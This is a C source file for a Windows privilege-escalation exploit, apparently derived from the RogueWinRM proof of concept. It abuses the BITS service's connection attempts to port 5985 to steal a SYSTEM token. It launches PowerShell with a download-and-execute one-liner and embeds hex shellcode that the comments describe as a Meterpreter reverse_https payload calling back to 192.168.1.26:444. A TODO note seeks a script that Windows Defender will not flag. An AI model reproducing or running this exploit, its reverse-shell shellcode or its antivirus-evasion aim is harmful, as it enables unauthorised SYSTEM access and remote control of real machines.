/*
This is an escalation privilege exploit which launch an arbitrary process as SYSTEM user.
It takes advantage of the BITS behavior which always try to connect on port 5985 (Windows
Remote Management) even if there is no WinRM service listening on that port. This exploit
launch a rogue WinRM service which force BITS service to authenticate by sending it a 401
challenge response packet. The authentication allows to steal a SYSTEM token as a primary
token, and use it to launch an arbitrary process as SYSTEM.

In practice, this exploit launch powershell.exe as SYSTEM with the following command line:
iex(New-Object Net.WebClient).DownloadString('http://127.0.0.1')
Internally, the exploit generate an evil powershell script which execute arbitrary shellcode.
A separate thread launches a http service listening on port 80 and is in charge of serving
this malicious powershell script.

Details of the vulnerability here :
https://decoder.cloud/2019/12/06/we-thought-they-were-potatoes-but-they-were-beans/

This exploit was developed from decoder's POC here:
https://github.com/antonioCoco/RogueWinRM

PREREQUISITES/
- Port 5985 must be free
- BITS must not be running

WARNING:
- As this exploit launches 2 services, a firewall popup may appear
- A powershell windows flashes on the screen. Thus, this exploit is not completely silent.

TODO:
- Find better powershell script as the current one is flagged by Windows Defender (Behavior)
*/

#include "../Common_Src_Files/pch.h"

int main(int argc, char** argv)
{
	BOOL debug = TRUE;
	int exit_status = -1;
	BOOL bReturnValue = TRUE;

	/* This shellcode is a windows/meterpreter/reverse_https, LHOST=192.168.1.26 LPORT=444
	Replace by your own shellcode for a demo. NULL BYTES ARE FORBIDDEN !
	In the dll, shellcode is allocated in the heap by a preexistent meterpreter session
	and address (char*) of that shellcode is passed as an argument in dllmain() */
	char shellcode[] = "\xda\xd7\xba\x2b\x2f\xd7\xc3\xd9\x74\x24\xf4\x5e\x31\xc9\xb1\x60\x83\xee\xfc\x31\x56\x13\x03\x7d\x3c\x35\x36\x7d\xaa\x3b\xb9\x7d\x2b\x5c\x33\x98\x1a\x5c\x27\xe9\x0d\x6c\x23\xbf\xa1\x07\x61\x2b\x31\x65\xae\x5c\xf2\xc0\x88\x53\x03\x78\xe8\xf2\x87\x83\x3d\xd4\xb6\x4b\x30\x15\xfe\xb6\xb9\x47\x57\xbc\x6c\x77\xdc\x88\xac\xfc\xae\x1d\xb5\xe1\x67\x1f\x94\xb4\xfc\x46\x36\x37\xd0\xf2\x7f\x2f\x35\x3e\xc9\xc4\x8d\xb4\xc8\x0c\xdc\x35\x66\x71\xd0\xc7\x76\xb6\xd7\x37\x0d\xce\x2b\xc5\x16\x15\x51\x11\x92\x8d\xf1\xd2\x04\x69\x03\x36\xd2\xfa\x0f\xf3\x90\xa4\x13\x02\x74\xdf\x28\x8f\x7b\x0f\xb9\xcb\x5f\x8b\xe1\x88\xfe\x8a\x4f\x7e\xfe\xcc\x2f\xdf\x5a\x87\xc2\x34\xd7\xca\x8a\xa4\x8d\x80\x4a\x51\x39\x01\x25\xc8\x91\xb9\xf5\x7d\x3c\x3e\xf9\x57\x71\x9b\x56\x0b\x21\x48\x0a\xc3\xff\x38\xd5\xb4\xff\x11\x76\xe8\x95\x9a\x2a\x5d\x02\x20\xcd\x61\xd2\xb0\x7e\x61\xd2\x40\x50\x50\x90\x39\xc3\xf9\x4d\x81\x4a\x45\x43\xa0\x5e\x71\xe1\x24\xe6\xe0\x71\xc2\x5a\x8b\x38\x57\x6b\x0c\xee\x19\xda\xf3\x10\xf5\xb4\xa4\x99\x6a\x82\xb4\x4f\x1d\xcd\x18\x18\x1d\xe0\x76\x5c\x4e\x57\xd4\x0a\x23\x01\xb2\x5f\x96\x83\x79\x5f\xcd\x4a\x17\x95\xb2\x1a\x68\x9a\x4c\xdb\xe1\x3d\x26\xdf\xa1\xd7\xa9\x89\x29\x5d\x93\xab\x2c\x62\xce\x87\x63\xce\xa3\x71\xec\xdd\x45\x66\x97\xe2\x9c\x13\xa7\x68\x08\x74\xa0\x80\x34\x84\xd8\xe2\xc4\xb1\xf8\x14\xf1\xf5\x8d\x27\x91\xf9\xdb\x1a\x37\x05\xf6\x31\xf7\x91\xf9\xd5\xf7\x61\x92\xd5\xf7\x21\x62\x85\x9f\xf9\xc6\x7a\xba\x05\xd3\xee\x17\xa9\x55\xf7\xc0\x25\x66\xd8\xee\xb5\x35\x4e\x86\xa7\x2f\xe7\xb4\x37\x9a\x7d\xf8\xbc\xe8\xf5\xff\x3d\x30\x8c\x3f\x48\x53\xd7\x7c\xec\x73\x81\x7d\xec\x7b\x63\xb8\x21\xaa\xb5\x8c\x7d\x9c\x84\xde\x4f\xd6\xe6";

	exit_status = RunRogueWinRM(shellcode, debug);
	return exit_status;
}
